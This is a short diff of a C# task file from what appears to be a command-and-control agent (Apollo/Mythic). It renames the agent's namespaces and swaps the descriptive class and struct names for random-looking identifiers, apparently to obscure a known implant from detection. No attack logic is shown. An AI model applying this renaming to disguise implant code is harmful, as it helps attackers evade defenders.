@@ -7,17 +7,17 @@
 #if REGISTER_FILE
 
 
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 using System.Runtime.Serialization;
 
 namespace Tasks
 {
-    public class register_file : Tasking
+    public class EfficientGatewayA347 : Tasking
     {
         [DataContract]
-        internal struct RegisterFileParameters
+        internal struct EfficientAdapter196C
         {
             [DataMember(Name = "file_id")]
             internal string FileID;
